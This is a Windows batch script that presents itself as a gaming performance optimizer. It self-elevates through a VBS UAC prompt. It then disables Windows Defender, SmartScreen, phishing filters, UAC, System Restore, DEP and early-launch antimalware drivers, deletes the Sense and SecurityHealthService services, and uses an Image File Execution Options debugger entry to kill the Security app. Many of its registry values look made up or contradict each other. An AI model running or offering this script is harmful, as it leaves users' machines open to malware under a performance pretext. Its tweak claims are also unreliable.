reg add "hklm\system\currentcontrolset\control\filesystem" /v "ntfsdisablecompression" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "ntfsdisableencryption" /t reg_dword /d "1" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "ntfsencryptpagingfile" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "ntfsmemoryusage" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "ntfsmftzonereservation" /t reg_dword /d "3" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "pathcache" /t reg_dword /d "128" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "refsdisablelastaccessupdate" /t reg_dword /d "1" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "udfssoftwaredefectmanagement" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "win31filesystem" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\session manager\executive" /v "additionalcriticalworkerthreads" /t reg_dword /d "00000016" /f
reg add "hklm\system\currentcontrolset\control\session manager\executive" /v "additionaldelayedworkerthreads" /t reg_dword /d "00000016" /f
reg add "hklm\system\currentcontrolset\control\session manager\i/o system" /v "countoperations" /t reg_dword /d "00000000" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management" /v "clearpagefileatshutdown" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management" /v "featuresettingsoverride" reg_dword /d "00000003" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management" /v "featuresettingsoverridemask" reg_dword /d "00000003" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management" /v "iopagelocklimit" /t reg_dword /d "08000000" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management" /v "largesystemcache" /t reg_dword /d "00000000" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management" /v "systempages" /t reg_dword /d "4294967295" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management" /v "disablepagingexecutive" /t reg_dword /d "1" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management" /v "iopagelocklimit" /t reg_dword /d "16710656" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management" /v "largesystemcache" /t reg_dword /d "00000000" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management\prefetchparameters" /v "enableboottrace" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management\prefetchparameters" /v "enableprefetcher" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\session manager\memory management\prefetchparameters" /v "enablesuperfetch" /t reg_dword /d "0" /f
for /f "tokens=2 delims==" %%a in ('wmic os get TotalVisibleMemorySize /format:value') do set mem=%%a
set /a ram=%mem% + 1024000
reg add "hklm\system\currentcontrolset\control" /v "svchostsplitthresholdinkb" /t reg_dword /d "%ram%" /f
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    goto MainMenu

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
@echo
RD /S /Q %temp%
MKDIR %temp%
@echo
takeown /f "C:\Windows\Temp" /r /d y
@echo
RD /S /Q C:\Windows\Temp
MKDIR C:\Windows\Temp
cls
bcdedit /set avoidlowmemory 0x8000000
bcdedit /set nolowmem Yes
bcdedit /set vsmlaunchtype Off
bcdedit /set vm No
bcdedit /set usephysicaldestination No
bcdedit /set forcefipscrypto No
bcdedit /set perfmem 0 
bcdedit /set noumex Yes
bcdedit /set groupaware off 
bcdedit /set configaccesspolicy Default
bcdedit /set MSI Default
bcdedit /set usephysicaldestination No
bcdedit /set usefirmwarepcisettings No
bcdedit /set linearaddress57 OptOut
bcdedit /set increaseuserva 268435328
bcdedit /set hypervisorlaunchtype off
bcdedit /set ems no
bcdedit /set sos off
bcdedit /set disableelamdrivers yes
bcdedit /set pae ForceDisable
bcdedit /set disabledynamictick yes
bcdedit /set useplatformtick yes
bcdedit /set tscsyncpolicy Legacy
bcdedit /set tpmbootentropy ForceDisable
bcdedit /set hypervisorlaunchtype off
bcdedit /set quietboot yes
bcdedit /timeout 0
bcdedit /set allowedinmemorysettings 0x0
bcdedit /set isolatedcontext No
bcdedit /set nx alwaysoff
bcdedit /set bootux disabled
bcdedit /set bootmenupolicy legacy
bcdedit /set x2apicpolicy enable
bcdedit /set uselegacyapicmode no
bcdedit /deletevalue useplatformclock
bcdedit /set debug No
bcdedit /set ems No
bcdedit /set bootems No 
bcdedit /set integrityservices disable
bcdedit /set bootlog no
bcdedit /event off
bcdedit /bootdebug off
bcdedit /set firstmegabytepolicy UseAll
bcdedit /set {globalsettings} custom:16000067 true
bcdedit /set {globalsettings} custom:16000069 true
bcdedit /set {globalsettings} custom:16000068 true 
fsutil behavior set disableLastAccess 0
fsutil behavior set disable8dot3 1 
bcdedit /set useplatformclock false
bcdedit /set disabledynamictick yes
bcdedit /set useplatformtick yes
bcdedit /timeout 0
bcdedit /set nx optout
bcdedit /set bootux disabled
bcdedit /set bootmenupolicy standard
bcdedit /set hypervisorlaunchtype off
bcdedit /set tpmbootentropy ForceDisable
bcdedit /set linearaddress57 OptOut
bcdedit /set increaseuserva 268435328
bcdedit /set firstmegabytepolicy UseAll
bcdedit /set avoidlowmemory 0x8000000
bcdedit /set nolowmem Yes
bcdedit /set allowedinmemorysettings 0x0
bcdedit /set isolatedcontext No
bcdedit /set vsmlaunchtype Off
bcdedit /set vm No
bcdedit /set configaccesspolicy Default
bcdedit /set MSI Default
bcdedit /set usephysicaldestination No
bcdedit /set usefirmwarepcisettings No
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows\CloudContent" /v DisableSoftLanding /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows\CloudContent" /v DisableWindowsSpotlightFeatures /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows\CloudContent" /v DisableWindowsConsumerFeatures /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows\DataCollection" /v DoNotShowFeedbackNotifications /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\WindowsInkWorkspace" /v AllowSuggestedAppsInWindowsInkWorkspace /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DontReportInfectionInformation /t REG_DWORD /d 1 /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontOfferThroughWUAU" /t REG_DWORD /d 1 /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SecHealthUI.exe" /v Debugger /t REG_SZ /d "%windir%\System32\taskkill.exe" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d 0 /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /f
reg add "HKLM\SYSTEM\ControlSet001\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener" /v Start /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v AITEnable /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v DisableInventory /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v DisablePCA /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v DisableUAR /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRecentDocsHistory" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CompatTelRunner.exe" /v Debugger /t REG_SZ /d "%windir%\System32\taskkill.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DeviceCensus.exe" /v Debugger /t REG_SZ /d "%windir%\System32\taskkill.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d 0 /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /f
schtasks /Change /TN "Microsoft\Windows\AppID\SmartScreenSpecific" /disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\AitAgent" /disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\ProgramDataUpdater" /disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\StartupAppTask" /disable
schtasks /Change /TN "Microsoft\Windows\Autochk\Proxy" /disable
schtasks /Change /TN "Microsoft\Windows\CloudExperienceHost\CreateObjectTask" /disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\BthSQM" /disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Uploader" /disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /disable
schtasks /Change /TN "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\Diagnostics" /disable
schtasks /Change /TN "Microsoft\Windows\FileHistory\File History (maintenance mode)" /disable
schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /disable
schtasks /Change /TN "Microsoft\Windows\PI\Sqm-Tasks" /disable
schtasks /Change /TN "Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /disable
schtasks /Change /TN "Microsoft\Windows\Shell\FamilySafetyMonitor" /disable
schtasks /Change /TN "Microsoft\Windows\Shell\FamilySafetyRefresh" /disable
schtasks /Change /TN "Microsoft\Windows\Shell\FamilySafetyUpload" /disable
schtasks /Change /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" /disable
schtasks /Change /TN "Microsoft\Windows\WindowsUpdate\Automatic App Update" /disable
schtasks /Change /TN "Microsoft\Windows\License Manager\TempSignedLicenseExchange" /disable
schtasks /Change /TN "Microsoft\Windows\Clip\License Validation" /disable
schtasks /Change /TN "\Microsoft\Windows\ApplicationData\DsSvcCleanup" /disable
schtasks /Change /TN "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /disable
schtasks /Change /TN "\Microsoft\Windows\PushToInstall\LoginCheck" /disable
schtasks /Change /TN "\Microsoft\Windows\PushToInstall\Registration" /disable
schtasks /Change /TN "\Microsoft\Windows\Shell\FamilySafetyMonitor" /disable
schtasks /Change /TN "\Microsoft\Windows\Shell\FamilySafetyMonitorToastTask" /disable
schtasks /Change /TN "\Microsoft\Windows\Shell\FamilySafetyRefreshTask" /disable
schtasks /Change /TN "\Microsoft\Windows\Subscription\EnableLicenseAcquisition" /disable
schtasks /Change /TN "\Microsoft\Windows\Subscription\LicenseAcquisition" /disable
schtasks /Change /TN "\Microsoft\Windows\Diagnosis\RecommendedTroubleshootingScanner" /disable
schtasks /Change /TN "\Microsoft\Windows\Diagnosis\Scheduled" /disable
schtasks /Change /TN "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /disable
del /F /Q "C:\Windows\System32\Tasks\Microsoft\Windows\SettingSync\*"
ipconfig /flushdns
powercfg.exe /hibernate off
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl /v IRQ8Priority /t REG_DWORD /d 1 /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v MinAnimate /t REG_SZ /d 0 /f >nul 2>&1
cls
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v AutoEndTasks /t REG_SZ /d 1 /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v HungAppTimeout /t REG_SZ /d 1000 /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v MenuShowDelay /t REG_SZ /d 8 /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v WaitToKillAppTimeout /t REG_SZ /d 2000 /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v LowLevelHooksTimeout /t REG_SZ /d 1000 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 1 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v LinkResolveIgnoreLinkInfo /t REG_DWORD /d 1 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoResolveSearch /t REG_DWORD /d 1 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoResolveTrack /t REG_DWORD /d 1 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoInternetOpenWith /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" /v WaitToKillServiceTimeout /t REG_SZ /d 2000 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /V "DisableSR" /T REG_DWORD /D 1 /F
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_AutoGameModeDefaultProfile" /t REG_BINARY /d "01000100000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_GameModeRelazaganProcesses" /t REG_BINARY /d "010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.7.10" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\USER\AppData\Roaming\.minecraft\versions\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TcpAckFrequency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MTU" /t REG_DWORD /d "5207" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MSS" /t REG_DWORD /d "1337" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowgameDVR" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableBoottrace" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "4000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "ForegroundLockTimeout" /t REG_SZ /d "150000" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsAll" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "GameFluidity" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGames" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGamesAll" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "CPUPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "PCIConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "AGPConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "Max Cached Icons" /t REG_SZ /d "2000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "AlwaysUnloadDLL" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AlwaysUnloadDLL" /v "Default" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "EnableBalloonTips" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "CpuCoresAlways" /t REG_DWORD /d "18" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "CpuUtilization" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "LatencyPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "RenderingSpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "RenderingPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuMax" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "MaxPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "MinPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "PerformancePriority" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "PerformanceSpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuMaxPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "CpuMaxPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuAccelerating" /t REG_DWORD /d "256" /f 
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuSpeed" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /ve /t REG_SZ /d "True" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "LatencySpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "RenderingPriority" /t REG_DWORD /d "3" /f
